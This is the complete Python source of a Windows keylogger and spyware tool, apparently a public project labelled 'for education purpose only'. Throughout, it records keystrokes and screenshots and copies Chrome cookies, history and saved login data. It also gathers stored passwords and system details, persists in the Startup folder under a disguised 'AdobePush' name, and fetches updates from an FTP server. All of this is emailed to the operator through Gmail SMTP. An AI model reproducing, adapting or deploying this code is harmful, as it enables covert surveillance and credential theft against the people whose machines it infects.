"""
____  ____  ____  ____  ____  ____  ____  ____  ____   ____   ____   ____   ____   ____
  _____           _ _                   _              _
 |  __ \         | (_)                 | |            | |
 | |__) |__ _  __| |_ _   _ _ __ ___   | | _____ _   _| | ___   __ _  __ _  ___ _ __
 |  _  // _` |/ _` | | | | | '_ ` _ \  | |/ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
 | | \ \ (_| | (_| | | |_| | | | | | | |   <  __/ |_| | | (_) | (_| | (_| |  __/ |
 |_|  \_\__,_|\__,_|_|\__,_|_| |_| |_| |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
                                                  __/ |         __/ | __/ |
                                                 |___/         |___/ |___/
____  ____  ____  ____  ____  ____  ____  ____  ____   ____   ____   ____   ____   ____

--> Coded by: Mehul Jain(mehulj94@gmail.com)
--> Github: https://github.com/mehulj94
--> Twitter: https://twitter.com/wayfarermj
--> For windows only

*For education purpose only.
"""

#Imported libraries
import os
import errno
import socket
import base64
import pyHook
import shutil
import signal
import smtplib
import urllib2
import getpass
import logging
import platform
import win32api
import pythoncom
import subprocess
import datetime
from ftplib import FTP
from PIL import ImageGrab
from email import Encoders
from Recoveries import Test
from contextlib import closing
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart

#-----------------------
ip = base64.b64decode("")   #IP to connect to FTP server
ftpkey = base64.b64decode("")   #FTP password
ftpuser = base64.b64decode("")  #FTP username
passkey = base64.b64decode("")  #Password to connect to GMAIL smtp server
userkey = base64.b64decode("")  #Username to connect to GMAIL smtp server
#-----------------------

buffer = ''
count_scr = 0
count_letter = 0
count_scremail = 0
check_count = 1234
SMTP_SERVER = "smtp.gmail.com"  #SMTP server address

#-----------------------
filematch = 'ABCD.exe'    #This name should be equal to exe that you'll upload in FTP folder. The current exe will update to this file
#-----------------------

directory = "/Radium"   #The updated exe should reside in /Radium directory in FTP server

current_system_time = datetime.datetime.now()   #Get current system time

#In this keylogger a folder "Intel" is made in C:\Users\Public\
#The keystrokes are saved in Logs folder by the name of IntelRST.txt
#Screenshots are saved in a folder inside Logs
#10 Screenshots are sent at a time and are moved to "ToZipScreenshots" for zipping them and send as attachment

path = "C:\Users\Public\Intel\Logs"
path_to_screenshot = "C:\Users\Public\Intel\Logs\Screenshots"   #Screenshots are saved in this folder
path_to_cookies = "C:\Users\Public\Intel\Logs"  #Cookies will be moved to this folder
dir_zip = "C:\Users\Public\Intel\Logs\ToZipScreenshots" #This folder will contain 10 screenshots and will zipped and sent as attachment
file_log = 'C:\Users\Public\Intel\Logs\IntelRST.txt'    #Contains keystrokes

currentdir = os.getcwd()    #Get current working directory
currentuser = getpass.getuser()  #Get current User

try:
    ip_address = socket.gethostbyname(socket.gethostname()) #Get Ip address
except:
    pass

try:
    os.makedirs(path)
    os.makedirs(dir_zip)
    os.makedirs(path_to_screenshot)
except OSError as exception:
    if exception.errno != errno.EEXIST:
        raise


#Function to check if the computer is connected to Internet
def internet_on():
    try:
        response = urllib2.urlopen('https://www.google.co.in', timeout=20)
        return True
    except urllib2.URLError as err:
        pass
    return False

def subprocess_args(include_stdout=True):
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None
        env = None

    if include_stdout:
        ret = {'stdout:': subprocess.PIPE}
    else:
        ret = {}

    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret

#Function to get the Process ID
def getpid(process_name):
    return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

#Function to get the Public IP
def getpublicip():
    try:
        return urllib2.urlopen('http://ip.42.pl/raw').read()
    except:
        pass

#Function to get the System information
def getsysinfo():
    return platform.uname()

#Function to get the output of command ipconfig /all
def getipcnfg():
    try:
        ipcfg_file = 'C:\Users\Public\Intel\Logs\ipcfg.txt'
        f = open(ipcfg_file, "w")
        f.write(subprocess.check_output(["ipconfig", "/all"], **subprocess_args(False)))
        f.close()
    except Exception as e:
        print e

#Function to get save passwords from browsers, ftp clients and other programs
def getpasswords():
    passwords = Test.Result()
    return str(passwords.run())

#Function to combine all the slave information and save in the info.txt file
def getslaveinfo():
    slave_info = 'C:\Users\Public\Intel\Logs\info.txt'
    open_slave_info = open(slave_info, "w")
    try:
        open_slave_info.write(getpasswords() + "\n")
    except Exception as e:
        print e
    open_slave_info.write("\n------------------------------\n")
    try:
        open_slave_info.write(getpublicip() + "\n")
    except Exception as e:
        print e
    open_slave_info.write("\n------------------------------\n")
    try:
        open_slave_info.write(' '.join(str(s) for s in getsysinfo()) + '\n')
    except Exception as e:
        print e
    open_slave_info.close()

#Function to delete the old exe after updating the current exe in slave pc
def deleteoldstub():
    checkfilename = 'AdobePush.exe'     #The exe in the startup will be saved by the name of AdobePush. When the exe will be updated the old exe will be deleted.
    checkdir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
    dircontent = os.listdir(checkdir)

    try:
        try:
            pids = getpid('AdobePush.exe')
            for id in pids:
                os.kill(int(id), signal.SIGTERM)
        except Exception as e:
            print e

        if checkfilename in dircontent:
            os.remove(checkdir + checkfilename)
    except Exception as e:
        print e

#Function to copy the exe to startup
def copytostartup():
    try:
        #-----------------------
        originalfilename = "Radiumkeylogger.py"  #This name should be equal to the name of exe/py that you create. Currently the name of this file is Radiumkeylogger.py
        #-----------------------
        #-----------------------
        coppiedfilename = 'AdobePush.py'    #The file will be copied to startup folder by this name
        #-----------------------
        copytodir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
        copyfromdir = currentdir + "\\" + originalfilename

        filesindir = os.listdir(copytodir)

        if coppiedfilename not in filesindir:
            try:
                shutil.copy2(copyfromdir, copytodir + coppiedfilename)
            except Exception as e:
                print e

    except Exception as e:
        print e

    return True

#Function to list directories content upto 3 level
def DriveTree():
    file_dir1 = 'C:\Users\Public\Intel\Logs\Dir_View.txt'   #The drive hierarchy will be saved in this file
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    no_of_drives = len(drives)
    file_dir_O = open(file_dir1, "w")

    for d in range(no_of_drives):
        try:
            file_dir_O.write(str(drives[d]) + "\n")
            directories = os.walk(drives[d])
            next_dir = next(directories)

            next_directories = next_dir[1]
            next_files = next_dir[2]

            next_final_dir = next_directories + next_files

            for nd in next_final_dir:
                file_dir_O.write("	" + str(nd) + "\n")
                try:
                    sub_directories = os.walk(drives[d] + nd)

                    next_sub_dir = next(sub_directories)[1]
                    next_sub_sub_file = next(sub_directories)[2]

                    next_final_final_dir = next_sub_dir + next_sub_sub_file

                    for nsd in next_final_final_dir:
                        file_dir_O.write("		" + str(nsd) + "\n")

                        try:
                            sub_sub_directories = os.walk(drives[d] + nd + '\\' + nsd)

                            next_sub_sub_dir = next(sub_sub_directories)[1]
                            next_sub_sub_sub_file = next(sub_sub_directories)[2]

                            next_final_final_final_dir = next_sub_sub_dir + next_sub_sub_sub_file

                            for nssd in next_final_final_final_dir:
                                file_dir_O.write("			" + str(nssd) + "\n")
                        except Exception as e:
                            pass

                except Exception as e:
                    pass
        except Exception as e:
            pass

    file_dir_O.close()
    return True

#Function to send the data i.e. info.txt, chrome data, login data, screenshots
def sendData(fname, fext):
    attach = "C:\Users\Public\Intel\Logs" + '\\' + fname + fext

    ts = current_system_time.strftime("%Y%m%d-%H%M%S")
    SERVER = SMTP_SERVER
    PORT = 465
    USER = userkey
    PASS = passkey
    FROM = USER
    TO = userkey

    SUBJECT = "Attachment " + "From --> " + currentuser + " Time --> " + str(ts)
    TEXT = "This attachment is sent from python" + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address

    message = MIMEMultipart()
    message['From'] = FROM
    message['To'] = TO
    message['Subject'] = SUBJECT
    message.attach(MIMEText(TEXT))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    message.attach(part)

    try:
        server = smtplib.SMTP_SSL()
        server.connect(SERVER, PORT)
        server.ehlo()
        server.login(USER, PASS)
        server.sendmail(FROM, TO, message.as_string())
        server.close()
    except Exception as e:
        print e

    return True

#Fucntion to steal chrome cookies
def cookiestealer():
    cookiepath = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\Google\Chrome\User Data\Default'

    cookiefile = 'Cookies'
    historyfile = 'History'
    LoginDatafile = "Login Data"

    copycookie = cookiepath + "\\" + cookiefile
    copyhistory = cookiepath + "\\" + historyfile
    copyLoginData = cookiepath + "\\" + LoginDatafile

    filesindir = os.listdir(path_to_cookies)

    if copycookie not in filesindir:
        try:
            shutil.copy2(copycookie, path_to_cookies)
        except:
            pass


    if copyhistory not in filesindir:
        try:
            shutil.copy2(copyhistory, path_to_cookies)
        except:
            pass


    if copyLoginData not in filesindir:
        try:
            shutil.copy2(copyLoginData, path_to_cookies)
        except:
            pass

    return True

#Function to move all the files that are to be sent via email to one place
def MoveAttachments(f_name):
    arch_name = "C:\Users\Public\Intel\Logs\\" + f_name
    if f_name == 'Screenshots':
        files = os.listdir(arch_name)
        try:
            for i in range(10):
                try:
                    shutil.move(arch_name + "\\" + files[i], dir_zip)
                except Exception as e:
                    print e
        except Exception as e:
            print e
    else:
        try:
            shutil.move(arch_name, dir_zip)
        except Exception as e:
            print e

#Function to zip the files
def ZipAttachments(f_name):
    arch_name = "C:\Users\Public\Intel\Logs\\" + f_name + "Attachments"
    files = os.listdir(dir_zip)

    try:
        shutil.make_archive(arch_name, 'zip', dir_zip)
    except Exception as e:
        pass

    for j in range(len(files)):
        try:
            os.remove(dir_zip + "\\" + files[j])
        except Exception as e:
            print e

#Function to take screenshot
def TakeScreenShot():
    ts = current_system_time.strftime("%Y%m%d-%H%M%S")
    try:
        scrimg = ImageGrab.grab()
        scrimg.save(path_to_screenshot + '\\' + str(ts) + '.png')
    except Exception as e:
        print e
    return True

#Function to upgrade the exe via ftp
def ftpupdate():
    try:
        chtodir = 'C://Users//' + currentuser + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
        try:
            os.chdir(chtodir)
        except Exception as e:
            print e

        ftp = FTP(ip)
        ftp.login(ftpuser, ftpkey)
        ftp.cwd(directory)

        for filename in ftp.nlst(filematch):
            fhandle = open(filename, 'wb')
            ftp.retrbinary('RETR ' + filename, fhandle.write)
            fhandle.close()

        if filematch in os.listdir(chtodir):
            deleteoldstub()
    except Exception as e:
        print e

    return True

#Function to send key strokes via email
def email():
    log_text = open(file_log, "rb")
    logtext = log_text.readlines()
    len_logtext = len(logtext)
    data = ""
    if internet_on() == True:
        for i in range(len_logtext):
            data = data + logtext[i]
        ts = current_system_time.strftime("%Y%m%d-%H%M%S")
        SERVER = SMTP_SERVER
        PORT = 465
        USER = userkey
        PASS = passkey
        FROM = USER
        TO = [userkey]
        SUBJECT = "Keylogger data " + "from --> " + currentuser + " Time --> " + str(ts)
        MESSAGE = data + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address
        message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
        try:
            server = smtplib.SMTP_SSL()
            server.connect(SERVER, PORT)
            server.ehlo()
            server.login(USER, PASS)
            server.sendmail(FROM, TO, message)
            data = ''
            server.close()
            log_text = open(file_log, 'w')
            log_text.close()
        except Exception as e:
            print e
    return True

#Catching the key strokes and emailing them
def OnKeyboardEvent(event):
    global count_letter
    global count_scr
    global count_scremail
    global buffer
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

    if event.Ascii == 13:
      
        buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": " + buffer
        logging.log(10, buffer)
        buffer = ''
        count_letter = count_letter + 1
        count_scr = count_scr + 1
        
    elif event.Ascii == 8:
      
        buffer = buffer[:-1]
        count_letter = count_letter + 1
        count_scr = count_scr + 1
        
    elif event.Ascii == 9:
      
        keys = '\t'
        buffer = buffer + keys
        count_letter = count_letter + 1
        count_scr = count_scr + 1
        
    elif event.Ascii >= 32 and event.Ascii <= 127:
      
        keys = chr(event.Ascii)
        buffer = buffer + keys
        count_letter = count_letter + 1
        count_scr = count_scr + 1

    if count_letter == 300:
        count_letter = 0
        email()    #Keystrokes will be emailed after every 300 key strokes

    if count_scr == 500:
        count_scr = 0
        TakeScreenShot()    #Screenshot will be taken after 500 key strokes
        count_scremail +=  1
        if count_scremail == 10:
            count_scremail = 0
            MoveAttachments('Screenshots')
            ZipAttachments('Screenshots')
            sendData('ScreenshotsAttachments', '.zip')    #Screenshots will be emailed 10 at a time

    return True

try:
    copytostartup()    #Copying the file to startup
except Exception as e:
    print e

if internet_on() == True:   #If internet is On
    try:
        if check_count == 1234:
            check_count = 0
            #Checking and updating the exe via ftp
            try:
                ftpupdate()
            except Exception as e:
                print e
            #Sending the attachments Directory tree, History, Login Data, Cookies, IP config and save passwords
            files_in_dir = os.listdir(path)
            if "DHLCiAttachments.zip" not in files_in_dir:
                DriveTree()
                try:
                    cookiestealer()
                except Exception as e:
                    print e
                getipcnfg()
                getslaveinfo()
                #Moving the attachment before zipping them and send
                try:
                    MoveAttachments('Dir_View.txt')
                    MoveAttachments('History')
                    MoveAttachments('Login Data')
                    MoveAttachments('Cookies')
                    MoveAttachments('ipcfg.txt')
                    MoveAttachments('info.txt')
                except Exception as e:
                    print e
                #Zipping the files
                ZipAttachments('DHLCi')
                #Sending the zip file
                sendData("DHLCiAttachments", ".zip")

            ts = current_system_time.strftime("%Y%m%d-%H%M%S")
            SERVER = SMTP_SERVER
            PORT = 465
            USER = userkey
            PASS = passkey
            FROM = USER
            TO = [userkey]
            SUBJECT = currentuser + ' : Slave is connected '
            MESSAGE = 'IP Address ---> ' + ip_address + '\nTime --> ' + str(ts)
            message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
            try:
                server = smtplib.SMTP_SSL()
                server.connect(SERVER, PORT)
                server.ehlo()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message)
                data = ''
                server.close()
            except Exception as e:
                print e
    except Exception as e:
        print e

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
